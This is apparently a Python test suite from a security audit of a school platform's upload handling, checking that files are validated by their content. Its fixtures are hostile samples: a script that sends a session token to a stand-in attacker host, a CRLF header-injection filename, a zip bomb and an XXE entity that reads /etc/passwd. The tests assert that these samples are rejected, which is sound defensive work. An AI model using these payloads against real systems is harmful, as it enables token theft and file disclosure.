"""Auditoria de segurança (bloco 3): uploads validados pelo CONTEÚDO.

Antes, cada upload confiava no tipo que o browser declarava — e os
anexos de comunicados nem isso: aceitavam qualquer ficheiro e serviam-no
de volta "inline" com o tipo declarado. Um professor podia anexar um
.html que corria como página da plataforma no browser de quem o abrisse
(com acesso à sessão guardada no browser)."""
import io
import zipfile

import openpyxl.xml
import pytest
from fastapi import HTTPException

from app.core import validacao_ficheiros
from tests.conftest import auth_headers, criar_escola_e_gestor
from tests.test_foto_perfil import _PNG_1X1
from tests.test_importacao import _construir_mini_pauta_xlsx

_HTML = b"<html><body><script>fetch('https://atacante.example/?t='+localStorage.saas_access_token)</script></body></html>"
_PDF = b"%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF"


def _zip(ficheiros: dict[str, bytes], compressao=zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compressao) as arquivo:
        for nome, conteudo in ficheiros.items():
            arquivo.writestr(nome, conteudo)
    return buffer.getvalue()


_DOCX = _zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:document/>"})


async def _criar_comunicado(client, headers) -> str:
    resp = await client.post("/api/v1/comunicados", headers=headers, json={
        "tipo": "COMUNICADO", "titulo": "Circular", "corpo": "Ver anexo.", "destinatario_tipo": "ESCOLA",
    })
    assert resp.status_code == 201, resp.text
    return resp.json()["id"]


# ==========================================
# Anexos de comunicados
# ==========================================
@pytest.mark.parametrize("nome,tipo_declarado", [
    ("circular.html", "text/html"),
    ("circular.pdf", "application/pdf"),  # mentir no tipo também não passa
    ("circular.svg", "image/svg+xml"),
])
async def test_anexo_html_e_recusado(client, nome, tipo_declarado):
    escola = await criar_escola_e_gestor(client, "anexo-html")
    headers = auth_headers(escola["token"])
    comunicado_id = await _criar_comunicado(client, headers)

    resp = await client.put(
        f"/api/v1/comunicados/{comunicado_id}/anexo", headers=headers,
        files={"ficheiro": (nome, _HTML, tipo_declarado)},
    )
    assert resp.status_code == 400, resp.text
    resp = await client.get(f"/api/v1/comunicados/{comunicado_id}/anexo", headers=headers)
    assert resp.status_code == 404


async def test_anexo_pdf_abre_no_browser_e_office_e_sempre_transferido(client):
    escola = await criar_escola_e_gestor(client, "anexo-tipos")
    headers = auth_headers(escola["token"])

    comunicado_id = await _criar_comunicado(client, headers)
    # O tipo declarado é ignorado — grava-se o tipo real.
    resp = await client.put(
        f"/api/v1/comunicados/{comunicado_id}/anexo", headers=headers,
        files={"ficheiro": ("circulação.pdf", _PDF, "application/octet-stream")},
    )
    assert resp.status_code == 200, resp.text
    resp = await client.get(f"/api/v1/comunicados/{comunicado_id}/anexo", headers=headers)
    assert resp.status_code == 200
    assert resp.headers["content-type"] == "application/pdf"
    assert resp.headers["x-content-type-options"] == "nosniff"
    disposicao = resp.headers["content-disposition"]
    assert disposicao.startswith("inline;")
    assert 'filename="circulacao.pdf"' in disposicao and "filename*=UTF-8''circula%C3%A7%C3%A3o.pdf" in disposicao

    comunicado_id = await _criar_comunicado(client, headers)
    resp = await client.put(
        f"/api/v1/comunicados/{comunicado_id}/anexo", headers=headers,
        files={"ficheiro": ("horario.docx", _DOCX, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
    )
    assert resp.status_code == 200, resp.text
    resp = await client.get(f"/api/v1/comunicados/{comunicado_id}/anexo", headers=headers)
    assert resp.status_code == 200
    assert resp.headers["content-type"] == "application/octet-stream"
    assert resp.headers["content-disposition"].startswith("attachment;")
    assert resp.content == _DOCX


def test_anexo_antigo_gravado_como_html_e_servido_como_transferencia():
    """Anexos gravados antes desta validação ficaram com o tipo declarado
    pelo browser — nunca voltam a ser servidos como página."""
    media_type, cabecalhos = validacao_ficheiros.cabecalhos_download("ataque.html", "text/html")
    assert media_type == "application/octet-stream"
    assert cabecalhos["Content-Disposition"].startswith("attachment;")
    assert cabecalhos["X-Content-Type-Options"] == "nosniff"


def test_nome_do_anexo_nao_altera_o_cabecalho():
    nome = 'a"; filename="x.html' + "\r\n" + "Set-Cookie: s=1.pdf"
    _, cabecalhos = validacao_ficheiros.cabecalhos_download(nome, "application/pdf")
    disposicao = cabecalhos["Content-Disposition"]
    assert disposicao.count('"') == 2 and "\r" not in disposicao and "\n" not in disposicao


# ==========================================
# Imagens/documentos com o tipo declarado falso
# ==========================================
async def test_logotipo_html_disfarcado_de_png_e_recusado(client):
    escola = await criar_escola_e_gestor(client, "logo-falso")
    headers = auth_headers(escola["token"])
    resp = await client.put(
        "/api/v1/configuracoes/logotipo", headers=headers,
        files={"ficheiro": ("logo.png", _HTML, "image/png")},
    )
    assert resp.status_code == 400, resp.text

    # Um PNG verdadeiro enviado com um tipo declarado errado é aceite (vale o conteúdo).
    resp = await client.put(
        "/api/v1/configuracoes/logotipo", headers=headers,
        files={"ficheiro": ("logo.jpg", _PNG_1X1, "image/jpeg")},
    )
    assert resp.status_code == 200, resp.text
    resp = await client.get("/api/v1/configuracoes/logotipo", headers=headers)
    assert resp.headers["content-type"] == "image/png"


# ==========================================
# Deteção de tipo e ficheiros comprimidos
# ==========================================
def test_detecao_de_tipos():
    assert validacao_ficheiros.detetar_tipo(_PNG_1X1) == validacao_ficheiros.PNG
    assert validacao_ficheiros.detetar_tipo(_PDF) == validacao_ficheiros.PDF
    assert validacao_ficheiros.detetar_tipo(_DOCX) == validacao_ficheiros.DOCX
    assert validacao_ficheiros.detetar_tipo(_construir_mini_pauta_xlsx()) == validacao_ficheiros.XLSX
    assert validacao_ficheiros.detetar_tipo(_HTML) is None
    # Um ZIP qualquer (ex.: com um executável) não passa por documento Office.
    assert validacao_ficheiros.detetar_tipo(_zip({"virus.exe": b"MZ..."})) is None
    # Office antigo (OLE): a extensão só escolhe entre .doc/.xls/.ppt.
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100
    assert validacao_ficheiros.detetar_tipo(ole, "pauta.xls") == validacao_ficheiros.XLS
    assert validacao_ficheiros.detetar_tipo(ole, "pauta.exe") is None


def test_zip_bomb_e_recusado_antes_de_abrir():
    bomba = _zip({"[Content_Types].xml": b"<Types/>", "xl/worksheets/sheet1.xml": b"0" * (60 * 1024 * 1024)})
    assert len(bomba) < 1024 * 1024
    with pytest.raises(HTTPException) as erro:
        validacao_ficheiros.validar_upload(bomba, {validacao_ficheiros.XLSX}, ".xlsx")
    assert erro.value.status_code == 400


# ==========================================
# Excel com DTD (XXE / "billion laughs")
# ==========================================
def _com_dtd(xlsx: bytes) -> bytes:
    entrada = zipfile.ZipFile(io.BytesIO(xlsx))
    saida = io.BytesIO()
    with zipfile.ZipFile(saida, "w", zipfile.ZIP_DEFLATED) as arquivo:
        for item in entrada.infolist():
            dados = entrada.read(item.filename)
            if item.filename == "xl/worksheets/sheet1.xml":
                dados = dados.replace(
                    b"<worksheet", b'<!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><worksheet', 1
                )
            arquivo.writestr(item, dados)
    return saida.getvalue()


async def test_mini_pauta_com_dtd_e_recusada(client):
    # O openpyxl só usa o defusedxml (que recusa qualquer DTD) se estiver instalado.
    assert openpyxl.xml.DEFUSEDXML is True

    escola = await criar_escola_e_gestor(client, "importacao-dtd")
    headers = auth_headers(escola["token"])
    resp = await client.post(
        "/api/v1/importacao/mini-pauta/preview", headers=headers,
        files={"ficheiro": ("pauta.xlsx", _com_dtd(_construir_mini_pauta_xlsx()), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
    )
    assert resp.status_code == 400, resp.text
